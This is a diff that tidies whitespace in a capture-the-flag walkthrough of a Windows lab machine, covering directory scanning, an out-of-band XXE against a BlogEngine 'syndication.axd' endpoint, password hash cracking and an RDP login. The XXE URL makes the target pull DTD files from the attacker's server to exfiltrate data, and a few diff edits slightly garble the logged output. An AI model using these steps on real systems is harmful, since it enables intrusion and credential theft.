@@ -41,10 +41,10 @@ We have only 2 open ports. Port 80 (http) and Port 3389 (RDP). So, let's start w
 We have access denied on the main page, let's search for directories.
 
 ```bash
-kali@kali:dirb http://10.48.171.145/                                                                                                                               
+kali@kali:dirb http://10.48.171.145/
 
 -----------------
-DIRB v2.22    
+DIRB v2.22
 By The Dark Raver
 -----------------
 
@@ -54,11 +54,11 @@ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 
-GENERATED WORDS: 4612                                                          
+GENERATED WORDS: 4612
 
 ---- Scanning URL: http://10.48.171.145/ ----
-==> DIRECTORY: http://10.48.171.145/aspnet_client/                                                                                                          
-+ http://10.48.171.145/blog (CODE:200|SIZE:23564)                                                                                                           
+==> DIRECTORY: http://10.48.171.145/aspnet_client/
++ http://10.48.171.145/blog (CODE:200|SIZE:23564)
 + http://10.48.171.145/Blog (CODE:200|SIZE:23564)
 ```
 
@@ -109,7 +109,7 @@ We get an error, probably because of firewall. Let's set common ports like 445.
 Visit the page at: *"http://10.48.171.145/blog/syndication.axd?apml=http://192.168.130.26:445/oob.xml*".
 
 ```bash
-kali@kali:python3 -m http.server 445                                                                                                                             
+kali@kali:python3 -m http.server 445
 Serving HTTP on 0.0.0.0 port 445 (http://0.0.0.0:445/) ...
 10.48.171.145 - - [12/Mar/2026 05:57:27] "GET /oob.xml HTTP/1.1" 200 -
 10.48.171.145 - - [12/Mar/2026 05:57:27] "GET /exfil.dtd HTTP/1.1" 200 -
@@ -169,10 +169,10 @@ Also, note while doing URL decoding, there may be spaces in the hash, replace th
 The hashes are encoded in base64, we can decode then and convert to hex format.
 
 ```bash
-kali@kali:echo "wob.....w0=" | base64 -d | xxd -p -c 32                                                                           
+kali@kali:echo "wob.....w0=" | base64 -d | xxd -p -c 32
 c286d2fc0bca....70d
 
-kali@kali:echo "hJg8Y.....XBhuw=" | base64 -d | xxd -p -c 32                                                                           
+kali@kali:echo "hJg8Y.....XBhuw=" | base64 -d | xxd -p -c 32
 84983c.....115c186ec
 ````
 
@@ -185,7 +185,7 @@ Loaded 2 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 SSE
 Warning: poor OpenMP scalability for this hash type, consider --fork=4
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-g.....t            (guest)     
+g.....t            (guest)
 1g 0:00:00:00 DONE (2026-03-12 06:06) 1.010g/s 14488Kp/s 14488Kc/s 14620KC/s (454579)..*7¡Vamos!
 Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
 Session completed.
@@ -329,12 +329,12 @@ We have no flag, but we find a username, who might have the password we found ea
 
 ```bash
 C:\Users>dir                                                                                                                                                 
- Volume in drive C has no label.                                                                                                                             
+Volume in drive C has no label.
  Volume Serial Number is A8A4-C362                                                                                                                           
- Directory of C:\Users                                                                                                                                       
-08/21/2023  08:36 AM    <DIR>          .                                                                                                                     
-08/21/2023  08:36 AM    <DIR>          ..                                                                                                                    
-08/09/2023  05:28 PM    <DIR>          .NET v2.0                                                                                                             
+ Directory of C:\Users
+8/21/2023  08:36 AM    <DIR>          .
+08/21/2023  08:36 AM    <DIR>          ..
+08/09/2023  05:28 PM    <DIR>          .NET v2.0
 08/09/2023  05:28 PM    <DIR>          .NET v2.0 Classic                                                                                                     
 08/09/2023  05:28 PM    <DIR>          .NET v4.5                                                                                                             
 08/09/2023  05:28 PM    <DIR>          .NET v4.5 Classic
@@ -343,8 +343,8 @@ C:\Users>dir
 12/21/2023  02:48 PM    <DIR>          kingarthy
 08/11/2023  11:47 AM    <DIR>          merlin
 09/04/2023  07:57 PM    <DIR>          Public
-               0 File(s)              0 bytes
-              11 Dir(s)   9,871,732,736 bytes free
+0 File(s)              0 bytes
+11 Dir(s)   9,871,732,736 bytes free
 ```
 
 We will login as kingarthy via RDP.
